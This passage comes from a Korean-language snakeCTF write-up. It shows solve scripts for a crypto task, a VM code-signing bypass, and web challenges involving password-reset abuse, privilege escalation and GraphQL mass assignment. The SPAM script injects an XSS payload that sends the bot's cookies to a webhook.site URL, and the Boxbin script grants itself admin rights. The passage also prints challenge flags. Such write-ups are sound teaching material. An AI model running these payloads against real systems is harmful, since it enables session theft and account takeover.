    if len(out_bytes) != 256: raise ValueError
    if len(key) < 8:   raise ValueError

    key = key[:8]
    outb = bytearray(out_bytes)
    inp = bytearray(256)

    for block in range(4):
        base = block * 32
        delta = -1 if (block % 2 == 0) else 1
        for s in range(32):
            t = inv_map[s]
            kidx = (s + delta) & 7
            x = outb[base + t]
            inp[base + s] = x ^ key[kidx]

    inp[128:256] = outb[128:256]
    return bytes(inp)


with open("output.txt","r") as f:
    out = bytes.fromhex(f.read())
key = b"snakeFTW"[:8]  # generate by GPT to use flagFormat(snakeCTF{})
tmp = out
plain = inv(tmp, key)
tmp = out[128:256] + out[:128]
plain2 = inv(tmp, key)
print((plain[:128]+plain2[:128]).decode())
```
## FLAG
Flag: `snakeCTF{cUd4_thR34d5_unle45hed_f0r_crYpt0_br3akthru_73a91c9b7fa0_parallel_execution_mastery_unlocks_the_encrypted_realm_yes_the_key_has_been_generated_via_an_LLM_guess_which_one_ce049c5067bbb598}`

# Odnet Nin

문제 설명에 따르면, 어떤 VM 프로그램에 대해 서명한 것만 *real console*에서 실행할 수 있다고 합니다. 이 *real console*에서 *key*를 얻는 것이 목표인 것을 알 수 있습니다.

바이너리는 두 가지 버전으로 존재합니다: `coderunner`, `codesigner`. 전자는 *real console*로 취급하는 것 같고, 후자는 코드가 수상하지 않을 때 서명하게 해주는 프로그램입니다.

문제 파일은 `coderunner` 와 `codesignerstub.c` 를 줍니다. 먼저 `codesignerstub.c` 를 본다면 다음과 같이 0x53 번에 VM syscall을 등록합니다.

```c
int16_t minivm_sys_getSystemSecret(minivm_t *vm, uint8_t sys_nr) {
#if IS_INTERNAL_CODESIGNING
    memcpy(&vm->memdata[2], "flag{fakeflagfortesting}", 25);
    return 0;
#else
    vm->running = false;
    vm->return_code = 0x4f4e;
    return 0;
#endif
}

void timeout_handler(int signum) {
    puts("Run time limit exceeded!");
    exit(1);
}

int main() {
    // ...
    minivm_register_syscall(&vm, 0x53, &minivm_sys_getSystemSecret);
    // ...
}
```

`libminivm.so` 에는 `minivm` 관련 VM Opcode와 메인 실행 루프가 정의되어 있습니다. 이 규칙에 맞춰 `pkg` 를 구성한 뒤 서명을 받아 임의로 VM Opcode들을 수행하여 플래그를 얻어내는 것이 과제인 것을 확인했습니다.

하지만 플래그를 로딩시켜주는 0x53번 syscall은 수상한 코드로 취급되어, 해당 syscall을 호출하는 VM이 `codesigner` 에서 확인될 경우 서명을 해주지 않습니다. 이 부분을 돌파해 내는것이 주요 과제입니다.

우선 저는 서명 매커니즘에 취약점이 있을까 하여 `libpkg.so` 를 먼저 보았습니다. VM Opcode와 미리 정의된 메모리 상태에 대해 `SHA1` 해시를 얻어내고, 이를 `pkg` 헤더에 포함, 헤더를 `SHA1` 해싱한 뒤 알려지지 않은 개인키 `retail_privkey` 로 서명하는 것을 확인했습니다.

`libpkg.so` 에서는 `retail_privkey` 가 RSA-PKCS#1.5 서명에 쓰인다는 것을 확인했습니다. `coderunner` 바이너리 내에 공개키가 하드코딩 되어있습니다. 이 공개키가 취약함을 가정하고 `RsaCtfTool` 을 실행하여 개인키를 크래킹하려 했지만, 해당 파라미터들은 안전했기 때문에 실패했습니다.

잠재적인 취약점을 발견했습니다. VM 안의 0x53번 syscall을 제한할 때 해당 호출을 정적으로 탐색하여 막는 것이 아닌, 실제로 0x53번 syscall를 호출하였을 때 해당 코드의 서명을 그만둡니다. 즉, `coderunner` 와 `codesigner` 에 대해 어떤 분기점을 제작하여, `coderunner` 에서는 0x53번 syscall을 호출하지만 `codesigner` 에서는 0x53번 syscall을 호출하지 않게 한다면, `codesigner` 에서는 0x53번 syscall을 직접적으로 호출하지 않았으니 서명을 정상적으로 해 줄 것이라는 것을 추론할 수 있습니다.

이제 합리적으로 `coderunner`와 `codesigner`를 나눌 수 있는 분기점을 찾아야 합니다. 저는 `libminivm.so` 내 `minivm_init` 함수에 주목하였습니다. 해당 함수는 기본적인 syscall을 정의하여 등록하는데, 이 중 3번 syscall, `getchar` 가 있습니다. 이 syscall을 사용하면 쉽게 분기를 제작할 수 있습니다.

시나리오를 토대로 코드를 작성하여, 플래그를 얻어내었습니다.

```python
from hashlib import sha1
import base64

OPERATION_ADD = 0
OPERATION_SUB = 1
OPERATION_AND = 2
OPERATION_OR = 3
OPERATION_XOR = 4
OPERATION_BSR = 5 # BITSHIFT_RIGHT
OPERATION_LDR = 6
OPERATION_STR = 7
OPERATION_LOADI = 8
OPERATION_ZERO = 9
OPERATION_ADDI = 10
OPERATION_JMP = 11
OPERATION_CALL = 12
OPERATION_BNZ = 14
OPERATION_SYSCALL = 15

class Opcode:
    def __init__(self, operation, reg1, v1, v2=None):
        if v2 == None:
            self.p2 = v1
        else:
            self.p2 = (v1 << 4) | v2
        self.p1 = (operation << 4) | reg1
    def build(self):
        return bytes([self.p1, self.p2])

from pwn import p64

def build_vm(opcodes=list[Opcode], initial_memory=[0] * 0x13):

    raw_opcodes = b""
    for opcode in opcodes:
        raw_opcodes += opcode.build()
    
    body = raw_opcodes + bytes(initial_memory)
    
    SIGNATURE = b"SNAK"
    ret = SIGNATURE + p64(len(raw_opcodes))[:2] + p64(len(initial_memory))[:2] + sha1(body).digest() + b"\x00" * 0x100 + body

    return base64.b64encode(ret).decode()


opcode_head = [
    Opcode(OPERATION_LOADI, 1, ord('r')), # Real mode, load 'r'
    Opcode(OPERATION_SYSCALL, 0, 3), # get char
    Opcode(OPERATION_SUB, 0, 0, 1), # Subtract, reg[0] -= reg[1]
]

opcode_body = [
    Opcode(OPERATION_SYSCALL, 0, 83) # load flag
]

for i in range(20):
    opcode_body += [
        Opcode(OPERATION_LOADI, 3, i + 51), # Initially 2
        Opcode(OPERATION_LDR, 0, 3, 0), # Add, reg[0] += reg[3]
        # now reg[0] contains flag.
        Opcode(OPERATION_SYSCALL, 0, 2), # test
        Opcode(OPERATION_LOADI, 0, 0)
    ]

# snakeCTF{4lw4ys_r0ll_y0ur_0wn_cryp70_18e201d9c3e71f5d}

opcode_head += [ Opcode(OPERATION_BNZ, 0, len(opcode_body)) ]

opcode_tail = [ Opcode(OPERATION_SYSCALL, 0, 1) ]
opcodes = opcode_head + opcode_body + opcode_tail

if __name__ == '__main__':
    print(f"Test: {build_vm(opcodes)}")
```

# WEB
## SPAM

---

### 풀이

Javascript 기반 인증 서비스입니다.

`docker-compose.yml` 을 살펴보면 bot을 포함해 총 7개의 서비스가 구동되고 있습니다.

플래그의 위치는 Bot 서비스의 Cookie이므로, Client side 취약점을 통해서 쿠키를 탈취해야 한다는 것을 알 수 있습니다.

문제의 핵심인 idp 서비스부터 분석을 시작했습니다.

우선 `setup.js`에서 Admin 계정을 생성하는 것을 확인할 수 있었습니다.

```python
-- Insert admin user
INSERT OR IGNORE INTO Users (id, email, password, firstName, lastName, groupId)
VALUES (0, 'admin@spam.gov.it', '', 'Admin', 'User', 2);
```

위 코드를 보면 관리자 계정의 패스워드를 빈 문자열로 설정하는 것을 확인할 수 있었습니다.

또한 `/api/auth/forgot` 엔드포인트에서 비밀번호 재설정 기능을 확인할 수 있었는데, 이 기능을 이용해서 관리자 계정의 비밀번호를 초기화해야 한다는 생각으로 문제에 접근하였습니다.

비밀번호 재설정 기능에는 구현상의 문제가 있었습니다.

`idp/pages/api/auth/forgot.js`를 살펴보면, `tokenData` 를 설정하는 부분에 `await` 키워드 없이 `db.get(...)` 을 사용하고 있었습니다.

```jsx
import crypto from "crypto";
import bcrypt from "bcrypt";

import { getUserFromId, getUserFromEmail, openDb } from "@/lib/database";
import { validatePassword } from "@/lib/validate";

export default async function handler(req, res) {
  if (!["POST", "PATCH"].includes(req.method)) {
    res.setHeader("Allow", ["POST", "PATCH"]);
    return res.status(405).end(`Method ${req.method} Not Allowed`);
  }

  const db = await openDb();

  if (req.method === "POST") {
    const { email } = req.body;
    if (!email) {
      return res.status(400).json({ error: "Email is required" });
    }

    const user = await getUserFromEmail(db, email);
    if (!user) {
      return res.status(200).json({ message: "If the user exists, a password reset link will be shown on their dashboard." });
    }

    const token = crypto.randomBytes(32).toString("hex");
    const expiresAt = new Date(Date.now() + 3600000);
    await db.run(
      "INSERT INTO PasswordResetTokens (userId, token, expiresAt, used) VALUES (?, ?, ?, ?)",
      user.id,
      token,
      expiresAt,
      false
    );

    return res.status(200).json({ message: "If the user exists, a password reset link will be shown on their dashboard." });
  } else if (req.method === "PATCH") {
    const { token, newPassword } = req.body;
    if (!token || !newPassword) {
      return res.status(400).json({ error: "Token and new password are required" });
    }

    const tokenData = db.get("SELECT * FROM PasswordResetTokens WHERE token = ?", token);
    console.log(tokenData);

    if (!tokenData) {
      return res.status(400).json({ error: "Invalid or expired token" });
    }
    const tokenUser = await getUserFromId(db, tokenData.userId);

    if (!tokenUser) {
      return res.status(400).json({ error: "Invalid user for the provided token" });
    }

    if (tokenData.used) {
      return res.status(400).json({ error: "This token has already been used" });
    }

    const now = new Date();
    if (new Date(tokenData.expiresAt) < now) {
      return res.status(400).json({ error: "This token has expired" });
    }
    
    if (!validatePassword(newPassword)) {
      return res.status(400).json({ error: "Password must be at least 8 characters long and contain at least one number and one special character and one capital letter" });
    }

    const hashedPassword = await bcrypt.hash(newPassword, 10);

    await db.run("UPDATE Users SET password = ? WHERE id = ?", hashedPassword, tokenUser.id);
    await db.run("UPDATE PasswordResetTokens SET used = ? WHERE token = ?", true, token);

    return res.status(200).json({ message: "Password has been successfully reset." });
  }
}
```

이 경우, `console.log(...)`를 통하여 `tokenData` 의 값을 확인해보면 Promise 객체가 되는 것을 확인할 수 있습니다.

```bash
$ docker compose logs next-app 

... ( 생략 ) ...
next-app-1  | Promise { <pending> }
... ( 생략 ) ...
```

그렇기 때문에

```jsx
const tokenUser = await getUserFromId(db, tokenData.userId);
```

에서도 문제가 발생합니다. `getUserFromId`는 아래와 정의되어 있습니다.

```jsx
export async function getUserFromId(db, id) {
    return db.get("SELECT * FROM Users WHERE id = ?", id || 0);
};
```

그러므로 `id` 의 기본값으로는 항상 0이 사용됩니다.

0은 관리자 계정의 아이디를 의미하므로, 관리자 계정의 비밀번호를 재설정 할 수 있게 됩니다.

관리자 계정을 획득했다면 이제 Bot을 사용할 수 있습니다.

```jsx
// /bot/index.js - line 69
const navigate = async (serviceId, botId) => {
    const services = [
        process.env.LOCAL_TEST_BASE_URL || "http://test:3001",
        process.env.LOCAL_INBS_BASE_URL || "http://inbs:3002",
        process.env.LOCAL_AGENZIA_USCITE_BASE_URL || "http://agenzia-uscite:3003",
        process.env.LOCAL_ASP_BASE_URL || "http://asp:3004",
        process.env.LOCAL_DSW_BASE_URL || "http://dsw:3005"
    ];

    currentBots.push({
        id: botId,
        browser,
        start: new Date()
    });

    let page;

    try {
        page = await browser.newPage();

        await page.setExtraHTTPHeaders({
            "ngrok-skip-browser-warning": "true"
        });

        const token = jwt.sign({ userId: 0 }, JWT_SECRET);
        await page.goto(SITE_BASEURL);
        await page.setCookie({
            "name": "token",
            "value": token,
            "domain": new URL(SITE_BASEURL).hostname,
        });
        await page.setCookie({
            "name": "flag",
            "value": process.env.FLAG || "snakeCTF{f4ke_fl4g_f0r_t3st1ng}",
            "domain": new URL(services[serviceId]).hostname,
        });

        await page.goto(`${SITE_BASEURL}/authorize?serviceId=${serviceId}`);
        await page.waitForSelector("#authorize-btn");

        const authorizationToken = await page.evaluate(() => {
            const props = window.__NEXT_DATA__.props.pageProps;
            return props.token
        });

        const callbackUrl = `${services[serviceId]}/callback?token=${authorizationToken}`;
        
        await sleep(1000);

        let response;
        response = await fetch(callbackUrl, {
            redirect: "manual",
        });

        const redirectUrl = response.headers.get("Location");
        const cookies = response.headers.get("Set-Cookie");
        
        const sessionCookie = cookies.split(";").find(cookie => cookie.startsWith("sessionId="));

        const sessionId = sessionCookie.split("=")[1];

        await page.setCookie({
            "name": "sessionId",
            "value": sessionId,
            "domain": new URL(services[serviceId]).hostname,
        });

        let targetUrl;
        if (redirectUrl.startsWith('http')) {
            targetUrl = redirectUrl;
        } else {
            const cleanRedirectUrl = redirectUrl.startsWith('/') ? redirectUrl.substring(1) : redirectUrl;
            targetUrl = `${services[serviceId]}/${cleanRedirectUrl}`;
        }

        await page.goto(targetUrl, {
            waitUntil: "networkidle2"
        });

        await sleep(10_000);
        finishedBots.push(botId);
    } catch (e) {
        if (timedoutBots.includes(botId)) return;

        if (dbg) console.error(`${COLORS.red}[${botId}]${COLORS.reset} - Exception:\n${e}`);
        erroredBots.push(botId);

        if (page) await page.close();
    } finally {
        if (timedoutBots.includes(botId)) return;

        await page.close();
        currentBots = currentBots.filter(b => b.id != botId);
    }
};
```

Bot 서비스의 `navigate` 함수를 확인하면 `FLAG` 를 쿠키에 담아 지정한 서비스에 요청을 보내는 것을 확인할 수 있습니다.

일반적으로 bot에 쿠키를 담아 특정 URL에 요청을 보내는 것은 XSS를 통한 공격에서 자주 사용되므로 각 서비스의 코드를 확인해보았습니다.

```jsx
// /test/server.js - line 15

const fetchUserData = async (token) => {
    const res = await fetch(`${process.env.LOCAL_IDP_BASE_URL || "http://next-app:3000"}/api/internal/user?id=${serviceId}`, {
        method: 'GET',
        headers: {
            'Authorization': `Bearer ${token}`,
            'Content-Type': 'application/json'
        }
    });
    if (!res.ok) {
        throw new Error('Failed to fetch user data');
    }

    return res.json();
};

app.get('/', (req, res) => {
    res.redirect(`${process.env.IDP_BASE_URL || "http://localhost:3000"}/authorize?serviceId=${serviceId}`);
});

app.get('/callback', async (req, res) => {
    const token = req.query.token;
    if (!token) {
        return res.status(400).send('Token is required');
    }

    const userData = await fetchUserData(token);
    const sessionId = crypto.randomBytes(16).toString('hex');
    sessions.set(sessionId, {
        ...userData,
        token,
    });
    res.cookie('sessionId', sessionId, { httpOnly: true, secure: true });
    res.redirect('/data');
});

...
...

app.get('/data', async (req, res) => {
    const sessionId = req.cookies.sessionId;
    if (!sessionId || !sessions.has(sessionId)) {
        return res.status(401).send('Unauthorized');
    }

    const userData = sessions.get(sessionId);
    if (!userData) {
        return res.status(404).send('User not found');
    }
    if (new Date(userData.expiry * 1000) < new Date()) {
        sessions.delete(sessionId);
        return res.redirect('/');
    }

    const data = await fetchUserData(userData.token);
    res.send(JSON.stringify(data, null, 2));
});
```

`test` 서비스의 코드를 확인해보면 `/data` 엔드포인트에서 `JSON.stringify`를 사용해 유저 정보를 아무 검증 없이 출력하는 것을 확인할 수 있습니다.

따라서 유저 정보를 통해 XSS가 가능합니다.

```jsx
// /idp/pages/api/internal/sync.js - line 20

export default async function handler(req, res) {
    await runMiddleware(req, res, cors);

    if (req.method !== "POST") {
        res.setHeader("Allow", ["POST"]);
        return res.status(405).end(`Method ${req.method} Not Allowed`);
    }

    const userData = await authRequired(req, res, true, req.query.id); // [1]
    if (!userData) return;

    if (userData.groupName !== "System") { // [2]
        return res.status(403).json({ error: "You do not have permission to perform this action" });
    }

    const {
        firstName,
        lastName,
        email,
    } = req.body;

    const db = await openDb();
    let query = "UPDATE users";
    if (firstName || lastName || email) {
        query += " SET";
        const updates = [];
        if (firstName) updates.push(` firstName = ?`);
        if (lastName) updates.push(` lastName = ?`);
        if (email) updates.push(` email = ?`);
        query += updates.join(",");
        query += " WHERE id = ?";
    }

    const params = [];
    if (firstName) params.push(firstName);
    if (lastName) params.push(lastName);
    if (email) params.push(email);
    params.push(userData.userId);

    try {
        const result = await db.run(query, params);
        if (result.changes > 0) {
            return res.status(200).json({ message: "User data updated successfully" });
        } else {
            return res.status(400).json({ error: "No changes made or user not found" });
        }
    } catch (error) {
        console.error("Database error:", error);
        return res.status(500).json({ error: "Internal server error" });
    }
}
```

유저 정보를 변경할 수 있는 다른 엔드포인트들에서는 `sanitizeInput()` 이라는 커스텀 함수를 통해 태그를 넣는 것을 방지합니다.

하지만 해당 API에서는 유저 인풋에 대해 아무 검증 없이 값을 변경하는 것을 확인할 수 있습니다.

하지만 `[1]` 과 `[2]` 에서 유저 권한에 대한 검증을 시도합니다.

**`[1]`  - `external` 에 대한 검증**

```jsx
// /idp/lib/auth.js - line 4

export const authRequired = async (req, res, isExternal = false, serviceId) => {
    const token = req.headers.authorization?.split(" ")[1];

    if (!token) {
        res.status(401).json({ message: "" });
        return false;
    }

    try {
        const decoded = jwt.verify(token, process.env.JWT_SECRET);
        console.log(decoded)
        const { userId, external } = decoded;

        if (isExternal && !external) {
            res.status(403).json({ message: "Forbidden1" });
            return false;
        } else if (!isExternal && external) {
            res.status(403).json({ message: "Forbidden2" });
            return false;
        } else if (serviceId != decoded.serviceId) {
            res.status(403).json({ message: "Forbidden3" });
            return false;
        }
	      ...
	      ...
	      ...
```

`authRequired` 함수에서는 `isExternal` 이라는 `boolean` 타입의 인자를 받고, 해당 값이 jwt를 디코딩해 얻은 `external` 값과 동일한지 비교합니다.

일반적인 로그인 과정에서는 jwt에 `external` 값을 포함시키지 않으므로 `external` 을 포함시키는 코드를 찾아야 합니다.

```jsx
// /idp/pages/authorize.js - line 6

export default function AuthorizePage({
    user,
    service,
    token,
    error
}) {
    if (error) {
        return (
            <div className="max-w-lg mt-10 mx-auto bg-red-500/10 border-red-500 p-4 border rounded-md">
                <h2 className="text-xl font-semibold">Error</h2>
                <p>{error}</p>
            </div>
        );
    }

    return (<>
        <div className="max-w-lg mt-10 mx-auto bg-blue-500/10 border-blue-500 p-4 border rounded-md">
            <h2 className="text-xl font-semibold">
                Log in to {service.name}
            </h2>
            <p className="text-xs italic">
                {service.description || "No description available."}
            </p>

            <p className="mt-2">
                You&apos;re about to log in to <strong>{service.name}</strong> as <strong>{user.firstName} {user.lastName}</strong>.
            </p>

            <Link href={`${service.redirectUri}?token=${token}`}>
                <Button id="authorize-btn" className="mt-2 w-full">
                    Authorize access
                </Button>
            </Link>
        </div>
    </>);
};

export async function getServerSideProps(context) {
    const { req } = context;
    const token = req.cookies.token;
    const serviceId = context.query.serviceId;
    
    try {
        const user = jwt.verify(token, process.env.JWT_SECRET);

        const db = await openDb();
        const userData = await getUserFromId(db, user.userId);
        delete userData.password;

        let query = "SELECT * FROM Services WHERE id = ?";
        if (userData.groupId !== 0) query += " AND hidden = 0";

        const service = await db.get(query, serviceId);

        const authorizationToken = jwt.sign(
            { userId: userData.id, external: true, serviceId: service.id },
            process.env.JWT_SECRET,
            { expiresIn: '1h' }
        );

        return {
            props: {
                user: userData,
                token: authorizationToken,
                service,
            },
        };
    } catch (error) {
        console.error("JWT verification failed:", error);
        return {
            redirect: {
                destination: '/signin',
                permanent: false,
            },
        };
    }
}
```

해당 엔드포인트의 코드를 확인해보면 현재 로그인된 유저 정보를 바탕으로 `external`이 `true` 인 토큰을 생성하고, 해당 jwt token을 HTML 페이지에 노출시킵니다.

따라서 `external`이 `true` 인 jwt token을 획득할 수 있습니다.

**`[2]` - 로그인된 user의 group 검증**

`external` 에 대한 검증을 통과하면 user의 group이 `System` 인지 검사하는 부분이 있습니다.

하지만 관리자의 `groupId`는 2번, 즉 `Admin` 이기 때문에 관리자의 group을 변경해야 합니다.

```jsx
// /idp/lib/actions.js

export const ACTIONS = {
		...
		...
		...
    "assignGroup": {
        name: "Assign Group",
        description: "Assign a user to a group",
        params: {
            userId: {
                name: "User ID",
                type: "number",
                required: true,
                description: "ID of the user to assign"
            },
            groupId: {
                name: "Group ID",
                type: "number",
                required: true,
                description: "ID of the group to assign the user to"
            }
        },
        execute: async (db, params) => {
            const { userId, groupId } = params;
            if (typeof userId !== "number" || typeof groupId !== "number") {
                throw new Error("User ID and Group ID are required");
            }

            const group = await db.get("SELECT * FROM Groups WHERE id = ?", groupId);
            if (!group) {
                throw new Error("Group not found");
            }

            await db.run("UPDATE Users SET groupId = ? WHERE id = ?", groupId, userId);
            return { success: true, message: "User assigned to group successfully" };
        }
    ...
    ...
    ...
    "healthCheck": {
        name: "Run Health Check",
        description: "Logs in to a platform with the administrator's credentials and checks if everything is working correctly",
        params: {
            platform: {
                name: "Platform ID",
                type: "number",
                required: true,
                description: "The platform ID to login to and check"
            }
        },
        execute: async (db, params) => {
            const { platform } = params;
            if (typeof platform !== "number") {
                throw new Error("Platform ID is required");
            }
            const platformData = await db.get("SELECT * FROM Services WHERE id = ?", platform);
            if (!platformData) {
                throw new Error("Platform not found");
            }

            const res = await fetch(`${process.env.REPORT_BOT_URL || 'http://bot:3100'}/visit`, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    platform,
                    secret: process.env.JWT_SECRET
                })
            });

            if (!res.ok) {
                const errorData = await res.json();
                console.log(errorData)
                throw new Error(`Failed to start health check: ${errorData.message || "Unknown error"}`);
            }
            const data = await res.json();

            return { success: true, message: `Started health check the requested platform (${data.id})` };
        }
    }
}
```

`ACTIONS` 에서는 여러 기능들을 수행할 수 있습니다.

`assignGroup` 에서는 특정 유저를 특정 그룹으로 이동시킵니다.
따라서 현재 로그인되어 있는 관리자의 그룹을 `System` 으로 변경시킨다면 검증을 통과할 수 있습니다.

또한 `healthCheck` 를 통해 봇을 호출할 수 있습니다.

```jsx
// /idp/pages/api/actions.js

export default async function handler(req, res) {
    if (req.method !== "POST") {
        res.setHeader("Allow", ["POST"]);
        return res.status(405).end(`Method ${req.method} Not Allowed`);
    }
    
    console.log(sanitizeInput)

    const userData = await authRequired(req, res);
    if (!userData) return;

    if (userData.groupName == "User") {
        return res.status(403).json({ error: "You do not have permission to perform this action" });
    }

    const { action, params } = req.body;

    if (!action || !ACTIONS[action]) {
        return res.status(400).json({ error: "Invalid action specified" });
    }

    const db = await openDb();
    const actionConfig = ACTIONS[action];

    console.log(actionConfig)

    const sanitizedParams = {};
    for (const key in actionConfig.params) {
        if (actionConfig.params[key].required && typeof params[key] !== actionConfig.params[key].type) {
            return res.status(400).json({ error: `${key} is required` });
        }
        sanitizedParams[key] = sanitizeInput(params[key]);
    }

    try {
        const result = await actionConfig.execute(db, sanitizedParams);
        await db.run(
            "INSERT INTO AuditLogs (userId, actionType, actionDetails, timestamp) VALUES (?, ?, ?, ?)",
            userData.userId,
            action,
            JSON.stringify(sanitizedParams),
            new Date().toISOString()
        );
        res.status(200).json(result);
    } catch (error) {
        console.error("Action execution error:", error);
        res.status(500).json({ error: error.message || "An error occurred while executing the action" });
    }
}
```

`ACTIONS`의 기능들은 `/api/actions` 를 통해 사용할 수 있습니다.

해당 엔드포인트에서는 그룹이 `User` 가 아닌지만 판별하기 때문에 그룹 변경이 가능합니다.

결론적으로 익스플로잇 시나리오는 다음과 같습니다.

1. 비밀번호 초기화를 통해 관리자(`Admin` )의 패스워드를 초기화한다.
2. 관리자로 로그인 한 뒤 `/api/actions`의 `assignGroup` 을 활용해 관리자 권한을 `System` 으로 변경한다.
3. `/authorize` 에서 `external` 이 `true` 인 jwt token을 획득한다.
4. `/api/internal/sync` 에서 관리자 정보를 쿠키를 탈취하는 XSS 페이로드로 변경한다.
5. `/api/actions`의 `healthCheck` 를 활용해 XSS 페이로드가 담긴 유저 정보를 봇에게 출력하여 플래그를 획득한다.

### 풀이 코드

```python
import requests, re, json

BASE = 'http://localhost:3000'
SID = 0
NEWPW = 'Test1234@'
ADMIN = 'admin@spam.gov.it'
WEBHOOK = "https://webhook.site/a4d8334b-4eaa-417d-b180-677bae737da1"

# 1) 비번 초기화
requests.patch(f'{BASE}/api/auth/forgot', json={'token': 'dummy', 'newPassword': NEWPW})

# 2) 관리자 로그인 -> JWT
admin_jwt = requests.post(f'{BASE}/api/auth/signin', json={'email': ADMIN, 'password': NEWPW}).text.strip()

# 3) /api/actions assignGroup
requests.post(f'{BASE}/api/actions',
              headers={'Authorization': f'Bearer {admin_jwt}'},
              json={'action': 'assignGroup', 'params': {'userId': 0, 'groupId': 0}})

# 4) /authorize 에 쿠키로 접근 -> __NEXT_DATA__에서 외부 토큰 추출
html = requests.get(f'{BASE}/authorize?serviceId={SID}',
                    headers={'Cookie': f'token={admin_jwt}; Max-Age=3600; Path=/'}).text
m = re.search(r'<script id="__NEXT_DATA__" type="application/json">([\s\S]*?)</script>', html, re.I)
ext_jwt = json.loads(m.group(1))['props']['pageProps']['token']

# 5) internal/sync 로 XSS 페이로드 주입
payload = f"<script>location.href = '{WEBHOOK}?cookie=' + document.cookie</script>"
requests.post(f'{BASE}/api/internal/sync?id={SID}',
              headers={'Authorization': f'Bearer {ext_jwt}'},
              json={'firstName': payload})

# 6) /api/actions healthCheck 트리거
requests.post(f'{BASE}/api/actions',
              headers={'Authorization': f'Bearer {admin_jwt}'},
              json={'action': 'healthCheck', 'params': {'platform': SID}})

```
### 플래그
`snakeCTF{42m_3ur0s_w3ll_sp3nt_0n_s3cur1ty_3851bd6b891a5064}`
---

## /b/locked

---

먼저, 플래그를 얻기위해서 10초 안에 캡챠 10개를 풀어야합니다. 

정상적인 플로우는 `/api/solve` 로 캡챠를 맞출 때마다 서버가 토큰을 발급하고 

토큰의 해시, 발급 시각 등을 DB에 저장한 뒤 토큰을 쿠키에 누적합니다. 

최종적으로 `/protected` 에서 쿠키의 토큰 수, 발급시각 등을 확인하여 플래그를 반환합니다. 

### 풀이흐름

캡챠를 한 번 풀면 `/api/solve`에서 토큰이 발급되며, 발급된 토큰은 `solvedCaptchas` 쿠키에서 확인할 수 있습니다. 

이 토큰을 쉼표로 10번 반복한 문자열로 덮어씁니다 (예: `TOKEN,TOKEN,TOKEN,...,TOKEN`)

그다음 `/protected`에 요청하면, 이 엔드포인트는 쿠키를 `split(',')`으로만 분리해 토큰 목록을 만듭니다.

이 후 병렬 검증 중 검증 후 삭제를 시도하여 DB 레코드를 여러 번 읽어 모두 동일한 `solvedAt`을 수집하고 플래그를 반환합니다.

### 플래그

```

snakeCTF{4n0n_byp4553d_th3_f1lt3r_14096e6c1cc5ef2c}
```

## Boxbin

---

`/api/graphql` 엔드포인트에서 GraphQL을 사용할 수 있던 문제였습니다.

문제 파일이나 코드는 따로 제공되지 않았습니다.

### 정보 수집

먼저, GraphQL 서버의 구조를 파악하기 위해 Introspection 쿼리를 전송했습니다.

```python
query IntrospectionQuery {
  __schema {
    # ...
  }
}
```

쿼리 결과로 얻은 전체 스키마 정보에서 다음과 같은 지점들을 발견했습니다.

- 주요 쿼리:
    - `users`: 모든 사용자 목록 조회 가능
    - `posts(orderBy: String)`: 게시물 목록을 정렬하여 조회하는 기능
    - `hiddenPosts`: 숨겨진 게시물을 조회하는 기능
- 주요 뮤테이션:
    - `signup`, `login`: 일반적인 회원가입 및 로그인 기능
    - `updateSettings(settings: String!)`: 사용자 설정을 업데이트하는 기능
- 주요 타입:
    - `User`: `id`, `username` 외에 `isAdmin` (Boolean) 필드가 존재

### 풀이 과정

가장 먼저 `posts` 쿼리의 `orderBy` 인자를 이용한 SQL Injection을 시도했으나 실패하였습니다.

서버가 해당 입력값에 대해 방어 로직을 갖추고 있는 것으로 판단하고 다른 접근법을 모색했습니다.

그러던 중 `users` 쿼리를 통해 시스템의 모든 사용자 정보를 조회했고, 단서를 발견했습니다.

```python
query {
  users {
    id
    username
    isAdmin
  }
}
```

→ 결과: 

```python
{
  "data": {
    "users": [
      {
        "id": "1",
        "username": "admin",
        "isAdmin": true
      },
      // ... 
    ]
  }
}
```

`isAdmin` 필드가 `true`인 관리자 계정이 존재함을 확인했습니다.

여기서 `updateSettings(settings: String!)`을 이용해서 우리가 생성한 계정의 `isAdmin` 값을 `true`로 변경하는 시나리오를 구상하고 익스플로잇 코드를 작성했습니다.

### 풀이 코드

```python
import requests
import random
import string

##### 서버 주소
BASE = "https://ed0536a0fedb9188f693f50e2e50a843.boxbin.challs.snakectf.org/"
BASE = "https://90663b13d3b077111ef8f1d32d24901c.boxbin.challs.snakectf.org/"
URL = BASE + "api/graphql"
#####

##### 계정 생성
username = ''.join(random.choice(string.ascii_lowercase) for i in range(12))
password = ''.join(random.choice(string.ascii_letters + string.digits) for i in range(12))
print(username, '/', password)
#####

##### 헤더 설정
headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Content-Type': 'application/json'
}
#####

##### 회원가입
mutation = "mutation($username: String!, $password: String!) { signup(username: $username, password: $password) }"
payload = {'query': mutation, 'variables': {'username': username, 'password': password}}
response = requests.post(URL, json=payload, headers=headers, timeout=10)
#####

##### 로그인 이후 인증 토큰 획득
mutation = "mutation($username: String!, $password: String!) { login(username: $username, password: $password) }"
payload = {'query': mutation, 'variables': {'username': username, 'password': password}}
response = requests.post(URL, json=payload, headers=headers, timeout=10)
headers['Authorization'] = f"{response.json()['data']['login']}"
#####

##### 관리자 권한 획득
update_mutation = 'mutation { updateSettings(settings: "{\\\"isAdmin\\\": true}") }'
update_payload = {'query': update_mutation}
response = requests.post(URL, json=update_payload, headers=headers, timeout=10)
#####

##### 플래그 조회
flag_query = "query { hiddenPosts { id title content } }"
flag_payload = {'query': flag_query}
response = requests.post(URL, json=flag_payload, headers=headers, timeout=10)
for post in response.json()['data']['hiddenPosts']:
    print(post.get('title'))
    print(post.get('content'))
#####
```

### 플래그

```python
snakeCTF{y0ur3_0n_b0xb1n_n0w_34931a631be1b2bb}
```

## exploitme

---

소개팅 어플 컨셉의 매칭/채팅 서비스입니다.

온보딩을 통과한 유저는 탐색/채팅 기능을 사용할 수 있고, 

문제의 플래그는 신고된 대화 (`match.is_reported=1` , `match_id=4`) 의 메시지 본문에 심겨 있습니다.

### 풀이 흐름

→  `/api/register`로 가입 

→ `/api/onboarding` 로 프런트에서 안내된 스키마 그대로 전송 

→ `/api/chat/4/report`로 임의 매치 신고 처리

→ `/api/edit`에서 `is_admin: true` 주입

→ `/api/chat/4`에서 관리자 권한으로 메시지 열람 

→ 플래그 획득

### 취약 코드 부분

**[ `pages/api/chat/[matchId]/report.js` ]**

